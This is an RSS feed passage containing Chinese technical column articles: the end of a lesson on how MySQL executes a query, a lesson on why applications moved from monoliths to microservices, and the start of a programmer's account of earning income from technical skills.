&lt;p>连接建立完成后，你就可以执行 select 语句了。执行逻辑就会来到第二步：查询缓存。&lt;/p>
&lt;p>MySQL 拿到一个查询请求后，会先到查询缓存看看，之前是不是执行过这条语句。之前执行过的语句及其结果可能会以 key-value 对的形式，被直接缓存在内存中。key 是查询的语句，value 是查询的结果。如果你的查询能够直接在这个缓存中找到 key，那么这个 value 就会被直接返回给客户端。&lt;/p>
&lt;p>如果语句不在查询缓存中，就会继续后面的执行阶段。执行完成后，执行结果会被存入查询缓存中。你可以看到，如果查询命中缓存，MySQL 不需要执行后面的复杂操作，就可以直接返回结果，这个效率会很高。&lt;/p>
&lt;p>&lt;strong>但是大多数情况下我会建议你不要使用查询缓存，为什么呢？因为查询缓存往往弊大于利。&lt;/strong>&lt;/p>
&lt;p>查询缓存的失效非常频繁，只要有对一个表的更新，这个表上所有的查询缓存都会被清空。因此很可能你费劲地把结果存起来，还没使用呢，就被一个更新全清空了。对于更新压力大的数据库来说，查询缓存的命中率会非常低。除非你的业务就是有一张静态表，很长时间才会更新一次。比如，一个系统配置表，那这张表上的查询才适合使用查询缓存。&lt;/p>
&lt;p>好在 MySQL 也提供了这种&amp;quot;按需使用&amp;quot;的方式。你可以将参数 query_cache_type 设置成 DEMAND，这样对于默认的 SQL 语句都不使用查询缓存。而对于你确定要使用查询缓存的语句，可以用 SQL_CACHE 显式指定，像下面这个语句一样：&lt;/p>
&lt;pre>&lt;code>mysql&amp;gt; select SQL_CACHE * from T where ID=10；
&lt;/code>&lt;/pre>
&lt;p>需要注意的是，MySQL 8.0 版本直接将查询缓存的整块功能删掉了，也就是说 8.0 开始彻底没有这个功能了。&lt;/p>
&lt;h1 id="分析器">分析器&lt;/h1>
&lt;p>如果没有命中查询缓存，就要开始真正执行语句了。首先，MySQL 需要知道你要做什么，因此需要对 SQL 语句做解析。&lt;/p>
&lt;p>分析器先会做&amp;quot;词法分析&amp;quot;。你输入的是由多个字符串和空格组成的一条 SQL 语句，MySQL 需要识别出里面的字符串分别是什么，代表什么。&lt;/p>
&lt;p>MySQL 从你输入的&amp;quot;select&amp;quot;这个关键字识别出来，这是一个查询语句。它也要把字符串&amp;quot;T&amp;quot;识别成&amp;quot;表名 T&amp;quot;，把字符串&amp;quot;ID&amp;quot;识别成&amp;quot;列 ID&amp;quot;。&lt;/p>
&lt;p>做完了这些识别以后，就要做&amp;quot;语法分析&amp;quot;。根据词法分析的结果，语法分析器会根据语法规则，判断你输入的这个 SQL 语句是否满足 MySQL 语法。&lt;/p>
&lt;p>如果你的语句不对，就会收到&amp;quot;You have an error in your SQL syntax&amp;quot;的错误提醒，比如下面这个语句 select 少打了开头的字母&amp;quot;s&amp;quot;。&lt;/p>
&lt;pre>&lt;code>mysql&amp;gt; elect * from t where ID=1;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'elect * from t where ID=1' at line 1
&lt;/code>&lt;/pre>
&lt;p>一般语法错误会提示第一个出现错误的位置，所以你要关注的是紧接&amp;quot;use near&amp;quot;的内容。&lt;/p>
&lt;h1 id="优化器">优化器&lt;/h1>
&lt;p>经过了分析器，MySQL 就知道你要做什么了。在开始执行之前，还要先经过优化器的处理。&lt;/p>
&lt;p>优化器是在表里面有多个索引的时候，决定使用哪个索引；或者在一个语句有多表关联（join）的时候，决定各个表的连接顺序。比如你执行下面这样的语句，这个语句是执行两个表的 join：&lt;/p>
&lt;pre>&lt;code>mysql&amp;gt; select * from t1 join t2 using(ID) where t1.c=10 and t2.d=20;
&lt;/code>&lt;/pre>
&lt;ul>
&lt;li>既可以先从表 t1 里面取出 c=10 的记录的 ID 值，再根据 ID 值关联到表 t2，再判断 t2 里面 d 的值是否等于 20。&lt;/li>
&lt;li>也可以先从表 t2 里面取出 d=20 的记录的 ID 值，再根据 ID 值关联到 t1，再判断 t1 里面 c 的值是否等于 10。&lt;/li>
&lt;/ul>
&lt;p>这两种执行方法的逻辑结果是一样的，但是执行的效率会有不同，而优化器的作用就是决定选择使用哪一个方案。&lt;/p>
&lt;p>优化器阶段完成后，这个语句的执行方案就确定下来了，然后进入执行器阶段。如果你还有一些疑问，比如优化器是怎么选择索引的，有没有可能选择错等等，没关系，我会在后面的文章中单独展开说明优化器的内容。&lt;/p>
&lt;h1 id="执行器">执行器&lt;/h1>
&lt;p>MySQL 通过分析器知道了你要做什么，通过优化器知道了该怎么做，于是就进入了执行器阶段，开始执行语句。&lt;/p>
&lt;p>开始执行的时候，要先判断一下你对这个表 T 有没有执行查询的权限，如果没有，就会返回没有权限的错误，如下所示 (在工程实现上，如果命中查询缓存，会在查询缓存返回结果的时候，做权限验证。查询也会在优化器之前调用 precheck 验证权限)。&lt;/p>
&lt;pre>&lt;code>mysql&amp;gt; select * from T where ID=10;
ERROR 1142 (42000): SELECT command denied to user 'b'@'localhost' for table 'T'
&lt;/code>&lt;/pre>
&lt;p>如果有权限，就打开表继续执行。打开表的时候，执行器就会根据表的引擎定义，去使用这个引擎提供的接口。&lt;/p>
&lt;p>比如我们这个例子中的表 T 中，ID 字段没有索引，那么执行器的执行流程是这样的：&lt;/p>
&lt;ol>
&lt;li>
&lt;p>调用 InnoDB 引擎接口取这个表的第一行，判断 ID 值是不是 10，如果不是则跳过，如果是则将这行存在结果集中；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>调用引擎接口取&amp;quot;下一行&amp;quot;，重复相同的判断逻辑，直到取到这个表的最后一行。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>执行器将上述遍历过程中所有满足条件的行组成的记录集作为结果集返回给客户端。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>至此，这个语句就执行完成了。&lt;/p>
&lt;p>对于有索引的表，执行的逻辑也差不多。第一次调用的是&amp;quot;取满足条件的第一行&amp;quot;这个接口，之后循环取&amp;quot;满足条件的下一行&amp;quot;这个接口，这些接口都是引擎中已经定义好的。&lt;/p>
&lt;p>你会在数据库的慢查询日志中看到一个 rows_examined 的字段，表示这个语句执行过程中扫描了多少行。这个值就是在执行器每次调用引擎获取数据行的时候累加的。&lt;/p>
&lt;p>在有些场景下，执行器调用一次，在引擎内部则扫描了多行，因此**引擎扫描行数跟 rows_examined 并不是完全相同的。**我们后面会专门有一篇文章来讲存储引擎的内部机制，里面会有详细的说明。&lt;/p>
&lt;h1 id="小结">小结&lt;/h1>
&lt;p>今天我给你介绍了 MySQL 的逻辑架构，希望你对一个 SQL 语句完整执行流程的各个阶段有了一个初步的印象。由于篇幅的限制，我只是用一个查询的例子将各个环节过了一遍。如果你还对每个环节的展开细节存有疑问，也不用担心，后续在实战章节中我还会再提到它们。&lt;/p>
&lt;p>我给你留一个问题吧，如果表 T 中没有字段 k，而你执行了这个语句 select * from T where k=1, 那肯定是会报&amp;quot;不存在这个列&amp;quot;的错误： &amp;ldquo;Unknown column &amp;lsquo;k&amp;rsquo; in &amp;lsquo;where clause&amp;rsquo;&amp;quot;。你觉得这个错误是在我们上面提到的哪个阶段报出来的呢？&lt;/p>
&lt;p>感谢你的收听，欢迎你给我留言，也欢迎分享给更多的朋友一起阅读。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/ce/d9/ce7f4e35916ed1aa49206a53a0547bd9.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 01丨是什么推动了单体应用到微服务架构的演进？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/springclouod%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/01%E4%B8%A8%E6%98%AF%E4%BB%80%E4%B9%88%E6%8E%A8%E5%8A%A8%E4%BA%86%E5%8D%95%E4%BD%93%E5%BA%94%E7%94%A8%E5%88%B0%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E7%9A%84%E6%BC%94%E8%BF%9B/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/springclouod%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/01%E4%B8%A8%E6%98%AF%E4%BB%80%E4%B9%88%E6%8E%A8%E5%8A%A8%E4%BA%86%E5%8D%95%E4%BD%93%E5%BA%94%E7%94%A8%E5%88%B0%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E7%9A%84%E6%BC%94%E8%BF%9B/</guid><description>
&lt;p>你好，我是姚秋辰。&lt;/p>
&lt;p>&amp;ldquo;微服务&amp;quot;是近些年在大型应用架构领域的一个热门话题，从实践领域来看，我们身边的一二线大厂也纷纷选择全面拥抱微服务。就拿国内 Java 系的一线大厂来说，如阿里系、美团点评、PDD 等，它们都将自己的核心业务系统构建在微服务架构之上。&lt;/p>
&lt;p>即便你是刚参加工作的萌新，也一定从铺天盖地的&amp;quot;微服务&amp;quot;相关信息流中了解到了这个名词的热度。谷歌搜索指数显示，自 2014 年起，微服务的搜索热度一路上升。&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/61/2a/61efecb5f468ab50c767804cc8ea172a.jpg?wh=2284x1213" alt="">&lt;br>
&amp;ldquo;微服务&amp;quot;的谷歌搜索指数&lt;/p>
&lt;p>其实，微服务并不是一个新兴的技术概念，很早之前它就已经进入了公众视野。&lt;/p>
&lt;p>早在 2012 年，一位叫做 Fred George 的技术专家就在一次大会上分享了自己的微服务落地经验，讲述他是如何带领团队将一个极度庞大的 J2EE 巨无霸程序，分解成 20 多个小服务的。作为微服务领域的先驱，他是这样描述微服务架构的：&lt;/p>
&lt;blockquote>
&lt;p>Micro Services Architecture - small, short lived services rather than SOA.&lt;/p>
&lt;/blockquote>
&lt;p>如果你在工作中没有接触过微服务架构的系统，那么此时一定非常蒙圈，不明白大佬所说的微服务架构到底是什么。没关系，就让我带你去回顾微服务的发展历史，了解微服务解决了什么痛点；然后我们一道来分析微服务架构的优势，让你明白为什么如今一线大厂会采用微服务架构。&lt;/p>
&lt;p>那么，我们就从微服务架构的前世今生聊起吧。&lt;/p>
&lt;h1 id="单体应用之殇">单体应用之殇&lt;/h1>
&lt;p>在互联网技术发展的早期阶段，我们采用&amp;quot;单体应用&amp;quot;的方式来构建网络系统。你没看错，即便是如今的各大老牌互联网大厂，在当年也是从单体应用小作坊成长起来的。&lt;/p>
&lt;p>以 Java 单体应用为例，我们将业务逻辑打包在一起，做成一个 WAR 包部署到 Tomcat、JBoss 之类的容器中，对外提供服务。业务上了一定规模之后，再通过集群化水平扩展的方式，将单体应用部署到一个集群中，承接更大的用户访问量。&lt;/p>
&lt;p>然而，随着业务复杂度的进一步提升，单体应用在生产力和高可用性层面就面临了巨大的挑战。我在参加工作之初做过近五年的单体应用开发，深知其中的痛处。&lt;/p>
&lt;p>我刚毕业的时候，参与了一个巨无霸的电商套件的开发，那是一个标准的单体应用。整个开发加测试团队有 100 多号人，所有人的代码都提交到一个主干分支，每次 merge 代码都要面对各种代码冲突，开发过程中&lt;strong>耗费了大量的沟通成本&lt;/strong>。不仅如此，由于庞大的业务体系都部署在一个 WAR 包中，每一次提交代码都要执行 3 个小时的回归测试，不出错还好，一旦出错就要回炉重造。周而复始执行这套繁重的流程，研发效率非常低下，完全&lt;strong>无法达到&amp;quot;快速迭代&amp;quot;的目的&lt;/strong>。&lt;/p>
&lt;p>在上线阶段我们也经常碰到各类问题。我参与的这个单体应用的发布周期是 2 个月一次（这在单体应用中已经算是很快的发布节奏了），每次发布一旦出现 Bug，&lt;strong>无法单独回滚&lt;/strong>这个小改动，我必须将整个发布里所有的功能全部回滚，待问题修复之后再重新发布。更可悲的是，整个 WAR 包的服务经常因为一个小 Bug 导致团灭，曾经有一次，我提交了一个&amp;quot;数据批量导入导出&amp;quot;的代码改动，把一个隐蔽 Bug 发布到了线上，业务持续运行一段时间之后，JVM 内存发生了泄露，导致集群各节点的 HEALTHCHECK 失败服务被重启，进而影响到了所有服务。&lt;/p>
&lt;p>上面这些问题是不是很让人头痛？想要解决它们，我们就要用到一句老话，叫&amp;quot;大事化小，小事化了&amp;rdquo;。&lt;/p>
&lt;p>在架构领域，我的经验是&amp;quot;一切看似大到无法解决的问题，都可以通过逐一拆解、各个击破的方式来解决&amp;rdquo;。在&amp;quot;单体应用&amp;quot;这个问题上，我们可以采取&amp;quot;微服务&amp;quot;化的方式，通过将这个巨无霸应用拆分成各个独立的小型微服务应用，分而治之！&lt;/p>
&lt;h1 id="微服务架构的优势">微服务架构的优势&lt;/h1>
&lt;p>微服务架构是在 SOA（面向服务架构）之上做的进一步扩展。在一线实践中，我们通过领域建模等理论将一个大型应用拆分成了更细粒度且边界清晰的服务模块。而且，每个微服务都能被独立测试、独立部署，并借助 Docker 和 CI/CD（持续集成环境）完成快速上线，不必像单体应用一样经历繁琐的 release 流程和漫长的发布窗口。&lt;/p>
&lt;p>每个微服务就像一个&amp;quot;麻雀虽小、五脏俱全&amp;quot;的小王国，&lt;strong>它拥有独立的代码库和数据库 Schema，通常由一个小规模的微服务技术团队全权负责，这个团队汇聚了产品、技术、架构等人员，采用 Scrum 之类的敏捷开发流程做快速迭代&lt;/strong>。基于此，微服务具备了&amp;quot;独立演进&amp;quot;能力。&lt;/p>
&lt;p>如果你对微服务拆分比较感兴趣，我推荐你去了解&amp;quot;领域建模&amp;quot;和&amp;quot;领域模型驱动（DDD）&amp;ldquo;的相关知识，后续我也会在这个课程中写一篇扩展阅读，跟你分享互联网公司常用的服务拆分规划理论：主链路规划。&lt;/p>
&lt;p>你现在肯定在好奇，为什么能独立开发部署的&amp;quot;微服务&amp;quot;可以解决单体应用的痛点呢？从我自己的经验来说，我认为微服务架构有这样几个天然的优势：&lt;/p>
&lt;ul>
&lt;li>&lt;strong>快速迭代 + 快速回滚&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>细粒度的可独立部署的小型服务，再加上敏捷开发模式的加持，可以让你对产品功能实现快速迭代。在互联网公司中，微服务团队通常以周甚至 0.5 周为时间单位进行快速迭代。如果迭代过程中发现线上 Bug，也可以在最短的时间内做线上回滚，并且不会影响到其他应用的正常发布。&lt;/p>
&lt;ul>
&lt;li>&lt;strong>资源利用大大提高&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>你可以将硬件等资源定向分配给需要用到资源的微服务，实现差异化的资源利用。在大厂的微服务体系中，我们会统计每个服务集群的线上压力水位，应用弹性计算技术在各个服务之间调配计算资源。&lt;/p>
&lt;ul>
&lt;li>&lt;strong>大幅降低协作成本&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>代码库、数据库、编译打包从&amp;quot;共享&amp;quot;变为了&amp;quot;独享&amp;rdquo;，微服务团队也保持了小规模特战队的模式，进一步降低了组内组外的沟通协作成本。&lt;/p>
&lt;ul>
&lt;li>&lt;strong>高可用&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>高可用是系统设计的第一目标，关于这一点，我想和你多介绍一些大厂微服务架构中的实践经验。通过这些介绍，让你对微服务化的必要性有更加深刻的认识。&lt;/p>
&lt;p>相比前牵一发而动全身的单体应用来说，我们可以通过很多技术手段对微服务施加个性化的保护措施，比如弹性机房水位调拨、流量整形、熔断降级。&lt;/p>
&lt;ul>
&lt;li>&lt;strong>弹性机房水位调拨&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>弹性机房实现了计算资源的自动分配，这种弹性伸缩能力必须建立在微服务化的基础上。它可以根据每个微服务的重要程度（核心服务 vs 边缘业务）以及当前承接的用户访问压力，动态地将计算资源（如虚机、云存储）分配给需要资源的服务。&lt;/p>
&lt;ul>
&lt;li>&lt;strong>流量整形&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>根据每个微服务承载能力的不同，控制外部流量抵达服务的速率。&amp;ldquo;限流&amp;quot;其实只是流量整形的一个场景，大型微服务的流量整形有很多种方式，比如匀速排队、流量预热、削峰填谷等等。&lt;/p>
&lt;ul>
&lt;li>&lt;strong>熔断降级&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>在流量高峰的时候，我们可以对边缘服务做人工降级，把计算资源腾挪给核心应用，降低核心服务的访问压力。除了人工降级以外，我们还可以为每个服务设置自动降级和熔断指标，比如当调用失败率达到某个阈值之后，开启自动降级措施，降低对下游业务的访问压力。&lt;/p>
&lt;p>我们只有把应用微服务化之后，才能更好地使用上面这些技术手段对业务系统做精细力度的保护，从而实现高可用的目标。&lt;/p>
&lt;p>到这里，相信你已经对微服务架构有了更深一步的认识。不过，任何事物都有其两面性，微服务不光有好的一面，也有很多问题等着我们去解决。比如集群环境下的服务治理、数据一致性、以及高并发场景下的服务容错等等。不过呢，你大可放心，这些问题都不算事儿，在实战环节我会教你如何使用 Spring Cloud 组件将其一一攻破。下节课，我们正式开启 Spring Cloud 的大门。&lt;/p>
&lt;h1 id="总结">总结&lt;/h1>
&lt;p>今天我带你了解了微服务架构，我们将单体应用和微服务架构做了个比较，分析了单体应用无法适应互联网快速迭代的痛点，以及微服务架构是如何利用灵巧敏捷的小规模服务，很好地适应了互联网行业的快速迭代和高可用保障的要求。&lt;/p>
&lt;p>总结来说，微服务架构是通过应用领域模型等理论，将庞大的单体应用拆分为更细粒度的小型服务，每个服务都可以独立部署、测试和发布，加之敏捷开发的推广，使得微服务很好地迎合了如今互联网行业快速试错、快速迭代的节奏，同时也保证了系统的可用性。&lt;/p>
&lt;h1 id="思考题">思考题&lt;/h1>
&lt;p>你的公司是否也采用了微服务架构呢？你能从技术角度分享一下公司项目的技术选型方案吗？欢迎你和我分享，我在留言区等你。&lt;/p>
&lt;p>好啦，这节课就结束啦，也欢迎你把这节课分享给更多对 Spring Cloud 感兴趣的朋友。我是姚秋辰，我们下节课再见！&lt;/p></description></item><item><title>极客专栏: 01丨程序员如何用技术变现（上）</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E5%B7%A6%E8%80%B3%E5%90%AC%E9%A3%8E/01%E4%B8%A8%E7%A8%8B%E5%BA%8F%E5%91%98%E5%A6%82%E4%BD%95%E7%94%A8%E6%8A%80%E6%9C%AF%E5%8F%98%E7%8E%B0%E4%B8%8A/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E5%B7%A6%E8%80%B3%E5%90%AC%E9%A3%8E/01%E4%B8%A8%E7%A8%8B%E5%BA%8F%E5%91%98%E5%A6%82%E4%BD%95%E7%94%A8%E6%8A%80%E6%9C%AF%E5%8F%98%E7%8E%B0%E4%B8%8A/</guid><description>
&lt;p>程序员用自己的技术变现，其实是一件天经地义的事儿。写程序是一门&amp;quot;手艺活儿&amp;quot;，那么作为手艺人，程序员当然可以做到靠自己的手艺和技能养活自己。&lt;/p>
&lt;p>然而，现在很多手艺人程序员却说自己是&amp;quot;码农&amp;quot;，编码的农民工，在工作上被各种使唤，各种加班，累得像个牲口。在职业发展上各种迷茫和彷徨，完全看不到未来的希望，更别说可以成为一个手艺人用自己的技能变现了。&lt;/p>
&lt;p>从大学时代帮人打字挣点零花钱，到逐渐通过自己的技能帮助别人，由此获得相对丰厚的收入，我在很早就意识到，从事编程这个事可以做到，完全靠自己的手艺、不依赖任何人或公司去生活的。&lt;/p>
&lt;p>这对于程序员来说，本就应该是件天经地义的事，只是好像并不是所有的程序员都能意识到自己的价值。这里，我想结合我的一些经历来跟你聊聊。当然，我的经历有限，也不一定全对，只希望能给你一个参考。&lt;/p>
&lt;h1 id="学生时代">学生时代&lt;/h1>
&lt;p>我是 1994 年上的大学，计算机科学软件专业。在 1996 年上大二的时候，因为五笔学得好打字很快，我应征到教务处帮忙，把一些文档录入到电脑里。打了三个月的字，学校按照每千字 10 元，给了我 1000 元钱。&lt;/p>
&lt;p>由于我的五笔越打越快，还会用 CCED 和 WPS 排版，于是引起了别人的注意，叫我帮忙去他的打字工作室，一个月收入 400 元。我的大学是在昆明上的，这相当于那会当地收入的中上水平了。&lt;/p>
&lt;p>后来，1997 年的时候，我帮一个开公司的老师写一些 MIS 软件，用 Delphi 和 PowerBuilder 写一些办公自动化和酒店管理的软件。一年后，老师给了我 2000 元钱。&lt;/p>
&lt;p>因为动手能力比较强，当时系上的老师要干个什么事都让我帮忙。而且，因为当时的计算机人才太少太少了，所以一些社会上的人需要开发软件或是解决技术问题也都会到大学来。基本上老师们也都推荐给我。&lt;/p>
&lt;p>还记得 1997 年老师推荐一个人来找我，问我会不会做网页？5 个静态页，10000 元钱。当时学校没教怎样做网页，我去书店找书看，结果发现书店里一本讲 HTML 的书都没有，只好回绝说&amp;quot;不会做&amp;quot;。一年后，我才发现原来这事简单得要命。&lt;/p>
&lt;h1 id="初入职场">初入职场&lt;/h1>
&lt;p>到了 1998 年，我毕业参加工作，在工商银行网络科。由于可以拨号上网，于是我做了一个个人主页，那时超级流行个人主页或个人网站。我一边收集网上的一些知识，一边学着做些花哨的东西，比如网页上的菜单什么的。&lt;/p>
&lt;p>在 2000 年时，机缘巧合我的网站被《电脑报》的编辑看到了，他写来邮件约我投稿。我就写了一些如何在网页上做菜单之类的小技术文章，每个月写个两三篇，这样每个月就有 300 元左右的稿费，当时我的月工资是 600 元。&lt;/p>
&lt;p>现在通过文章标题还能找到一两篇，比如《&lt;a href="http://www.yesky.com/251/142751all.shtml">抽屉式菜单的设计&lt;/a>》，已经是乱码一堆了。&lt;/p>
&lt;p>大学时代被人请去做事的经历对我影响很大，甚至在潜意识里完全影响了我如何规划自己的人生。虽然当时我还说不清楚，只是一种强烈的感觉&amp;mdash;&amp;mdash;我完全可以靠自己的手艺、不依赖任何人或公司去生活。&lt;/p>
&lt;p>我想这种感觉，我现在可以说清楚了，这种潜意识就是&amp;mdash;&amp;mdash;&lt;strong>我完全没有必要通过打工听人安排而活着，而是反过来通过在公司工作提高自己的技能，让自己可以更为独立和自由地生活&lt;/strong>。&lt;/p>
&lt;p>因而，在工作当中，对于那些没什么技术含量的工作，我基本上就像是在学生时代那样交作业就好了。我想尽一切方法提高交作业的效率，比如，提高代码的重用度，能自动化的就自动化，和需求人员谈需求，简化掉需求，这样我就可以少干一些活了&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>这样一来，&lt;strong>我就可以有更多的时间，去研究公司里外那些更为核心更有技术含量的技术了&lt;/strong>。&lt;/p>
&lt;p>在工作中，我总是能被别人和领导注意到，总是有比别人更多的时间去读书，去玩一些高技术含量的技术。当然，这种被&amp;quot;注意&amp;quot;，也不全然是一种好事。&lt;/p>
&lt;p>2002 年，我被外包到银行里做业务开发时，因为我完成项目的速度太快，所以，没事干，整天在用户那边看书，写别的代码练手，而被用户投诉&amp;quot;不务正业&amp;quot;。我当然对这样的投诉置之不理，还是我行我素，因为我的作业已交了，所以用户也就是说说罢了。&lt;/p>
&lt;p>同年，我到了一家新的很有技术含量的公司，他们在用 C 语言写一个可以把一堆 PC 机组成一个超级计算机，进行并行计算的公司项目。&lt;/p>
&lt;p>当我做完第一个项目时，有个公司里的牛人和我说，你用 Purify 测试一下你的代码有没有内存问题。Purify 是以前一个叫 Rational 的公司（后来被 IBM 收购）做的一个神器，有点像 Linux 开源的 Valgrind。&lt;/p>
&lt;p>用完以后，我觉得 Purify 太厉害了，于是把它的英文技术文档通读了一遍。经理看我很喜欢这个东西，就让我给公司里的人做个分享。我认真地准备了个 PPT，结果只来了一个 QA。&lt;/p>
&lt;p>我在一个大会议室就对着她一个人讲了一个半小时。这个 QA 对我说，&amp;ldquo;你的分享做得真好，条理性很强，也很清楚，我学到了很多东西&amp;rdquo;。&lt;/p>
&lt;p>有了这个正向反馈，我就把关于 Purify 的文章分享到了我的 CSDN 博客上，标题为《&lt;a href="http://blog.csdn.net/haoel/article/details/2900">C/C++ 内存问题检查利器&amp;mdash;Purify&lt;/a>》。可能因为这个软件是收费的，用的人不多，这篇文章的读者反响并不大。&lt;/p>
&lt;p>但是，2003 年的一天我很意外地接到了一个电话，是一个公司请我帮忙去给客户培训 Purify 这个软件。IBM 的培训太贵了，所以代理这个软件的公司为了成本问题，想找一个便宜的讲师。&lt;/p>
&lt;p>他们搜遍整个中国的互联网，只看到我的这篇文章，便通过 CSDN 找到我的联系方式，给我打了电话。最终，两天的培训价格税后一共 10000 元，而我当时的月薪只有 6000 元，还是税前。&lt;/p>
&lt;p>这件事儿让我在入行的时候就明白了一些道理。&lt;/p>
&lt;ul>
&lt;li>
&lt;p>要去经历大多数人经历不到的，要把学习时间花在那些比较难的地方。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>要写文章就要写没有人写过的，或是别人写过，但我能写得更好的。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>更重要的是，技术和知识完全是可以变现的。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>现在回想一下，技术和知识变现这件事儿，在 15 年前我就明白了，哈哈。&lt;/p>
&lt;p>随后，我在 CSDN 博客上发表了很多文章，有谈 C 语言编程修养的文章，也有一些 makefile/gdb 手册性的文章，还有在工作中遇到的各种坑。&lt;/p>
&lt;p>因为我分享的东西比较系统，也是独一份，所以，搜索引擎自然是最优化的（最好的 SEO 就是独一份）。我的文章经常因为访问量大被推到 CSDN 首页。因此，引来了各种培训公司和出版社，还有一些别的公司主动发来的招聘，以及其他一些程序员想伙同创业的各种信息。&lt;/p>
&lt;p>紧接着我了解到，出书作者收入太低（作者的收入有两种：一种是稿费，一页 30 元；一种是版税，也就 5% 左右），而培训公司的投入产出比明显高很多后，于是我开始接一些培训的事（频率不高），一年有个七八次。当时需求比较强的培训主要是在这几个技术方面，C/C++/Java、Unix 系统编程、多层软件架构、软件测试、软件工程等。&lt;/p>
&lt;p>我喜欢做企业内训，还有一个主要原因是，可以走到内部去了解各个企业在做的事和他们遇到的技术痛点，以及身在其中的工程师的想法。这极大地增加了我对社会的了解和认识。而同时，让我这个原本不善表达的技术人员，在语言组织和表达方面有了极大的提升。&lt;/p>
&lt;p>其间也有一些软件开发的私活儿，但我基本全部拒绝了。最主要的原因是，这些软件开发基本上都是功能性的开发，我从中无法得到成长。而且后期会有很多维护工作，虽然一个小项目可以挣十几万，但为此花费的时间都是我人生中最宝贵的时光，得不偿失。&lt;/p>
&lt;p>&lt;strong>25~35 岁是每个人最宝贵的时光，应该用在刀刃上&lt;/strong>。&lt;/p>
&lt;h1 id="职业上升期">职业上升期&lt;/h1>
&lt;p>因为有了这些经历，我感受到了一个人知识和技能的价值。我开始把我的时间投在一些主流、高级和比较有挑战性的技术上，这可以让我保持两件事儿：一个是技术和技能的领先，二是对技术本质和趋势的敏感度。&lt;/p>
&lt;p>因此，我有强烈的意愿去前沿的公司经历和学习这些东西。比如，我在汤森路透学到了人员团队管理上的各种知识和技巧，而亚马逊是让我提升最快的公司。虽说，亚马逊也有很多不好的东西，但是它的一些理念，的确让我的思维方式和思考问题的角度有了质的飞跃。&lt;/p>
&lt;p>所以后来，我开始对外输出的不仅仅是技术了，还有一些技术价值观上的东西。&lt;/p>
&lt;p>而从亚马逊到阿里巴巴是我在互联网行业的工作经历，这两段经历让我对这两家看似类似但内部完全不同的成功大公司，有了更为全面的了解和看法。&lt;/p>
&lt;p>这两种完全不一样甚至有些矛盾的玩法让我时常在思考着，大脑里就像两个小人在扳手腕一样，这可能是我从小被灌输的&amp;quot;标准答案&amp;quot;的思维方式所致。其实，这个世界本来就没什么标准答案，或是说，一个题目本来就可以有若干个正确答案，而且这些&amp;quot;正确答案&amp;quot;还很矛盾。&lt;/p>
&lt;p>于是，在我把一些价值观和思考记录下来的同时，我自然又被很多人关注到了，还吸引很多不同的思路在其中交织讨论。而从另外一方面来说，这对我来说是一个很好地补充，无论别人骂我也好，教育我也罢，他们都对我有帮助，大大地丰富了我思考问题的角度。&lt;/p>
&lt;p>这些经历从质上改善了我的思考方式，让我思考技术问题的角度都随之有了一个比较大的转变。而这个转变让我有了更高的思维高度和更为开阔的视野。&lt;/p>
&lt;p>可能是因为我有一些&amp;quot;独特&amp;quot;的想法，而且经历比较丰富，基础也比较扎实，使得我对技术人的认识和理解会更为透彻和深入。所以，也有了一些小名气。来找我做咨询和帮助解决问题的人越来越多，而我也开始收费收得越来越贵了。这里需要注意的是，我完全是被动收费高的。&lt;/p>
&lt;p>因为父亲的身体原因，我没有办法全职，所以成了一个自由人。而也正因如此，我才得以有机会可以为更多公司解决技术问题。2015 年，有家公司的后端系统一推广就挂，性能有问题，请我去看。&lt;/p>
&lt;p>我花了两天时间跟他们的工程师一起简单处理了一下，直接在生产线上重构，性能翻了 10 倍。虽然这么做有点 low，但当时完全是为了救急。公司老板很高兴，觉得他投的几百万推广费用有救了，一下给了我 10 万元。我说不用这么多的，1 万元就好了，结果他说就是这么多。&lt;strong>我欣然接受了，当时心里有一种技术被尊重的感动&lt;/strong>。&lt;/p>
&lt;p>2016 年，某个公司需要做一个高并发方案，大概需要 2000 万 QPS，但是他们只能实现到 1200 万 QPS 左右。&lt;/p>
&lt;p>我花了两天时间做调研，分析性能原因，然后一天写了 700 多行代码。因为不想进入业务，所以我主要是优化了网络数据传输，让数据包尽量小，确保一个请求的响应在一个 MTU 内就传完。&lt;/p>
&lt;p>测试的时候，达到了 2500 万 QPS。于是老板给了我 20 万。&lt;/p>
&lt;p>这样的例子还有很多。上面的例子，我连钱都没谈就去做了，本来想着，也就最多 1 万元左右，没想到给我的酬劳大大超出了我的期望。&lt;/p>
&lt;p>这里，我想说的是，&lt;strong>并不是社会不尊重程序员，只要你能帮上大忙，就一定会赢得别人的尊重&lt;/strong>。&lt;/p>
